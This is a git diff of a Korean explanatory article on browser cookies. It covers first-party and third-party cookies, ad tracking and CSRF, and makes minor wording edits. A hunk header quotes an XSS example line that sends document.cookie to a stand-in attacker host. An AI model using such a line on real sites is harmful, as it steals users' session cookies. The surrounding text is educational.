@@ -93,7 +93,7 @@ location.href = 'https://😈.com?cookies=' + document.cookie
 
 ### First Party, Third Party
 
-First Party쿠키는 브라우저가 액세스한 서비스가 해당 서비스 내에서만 유효한 쿠키를 써넣는 것이다. 반면, Third Party쿠키는 광고 등의 용도로 외부 서비스에서 읽을 수 있는 쿠키를 삽입해 사이트를 넘어서 행동 추적을 가능하게 해주는 쿠키입니다.
+First Party쿠키는 브라우저가 액세스한 서비스가 해당 서비스 내에서만 유효한 쿠키를 써넣는 것입니다. 반면, Third Party쿠키는 광고 등의 용도로 외부 서비스에서 읽을 수 있는 쿠키를 삽입해 사이트를 넘어서 행동 추적을 가능하게 해주는 쿠키입니다.
 
 Third Party쿠키는 액세스한 사이트(origin.com)와 다른 사이트(ad-tech.com)의 쿠키입니다.
 
@@ -110,8 +110,6 @@ origin.com에 다음과 같은 tag를 포함하는 방법으로 요청할 수 �
 페이지가 로드 되면 광고 마크업도 로드되고, *[ad.doubleclick.net/the-extension-to-the-creative](http://ad.doubleclick.net/the-extension-to-the-creative)* 로 요청이 전송되고, 쿠키를 사용자에게 전달합니다.
 
 Third Party쿠키는 보안 문제에서 자유롭지 못합니다. 예를 들어 사용자가 은행 사이트에 로그인하여 신용카드 결제를 위해 로그인하고 로그아웃 하지 않은 상태에서 악성 사이트로 이동하면 CSRF 공격이 발생할 수 있습니다. 사용자가 은행 사이트에 '인증 된'상태이므로 악성 사이트에서 송금 등의 액션을 취할 수도 있습니다.
-
-(요기는 나중에 더 다듬기)
 
 한 가지 더 예를 들자면, 누군가 so-so.dev의 이미지를 다른 사이트에서 사용한다고 가정해봅니다. 사용자가 so-so.dev에서 쿠키를 받아간 적이 있다면 다른 사이트에서 so-so.dev의 이미지 요청 시 해당 쿠키도 같이 요청 됩니다. 다른 사이트에서는 so-so.dev의 쿠키를 사용하지 않지만 so-so.dev로 요청하고 있으므로 해당 쿠키가 다른 사이트에서 사용 된 것입니다.
 
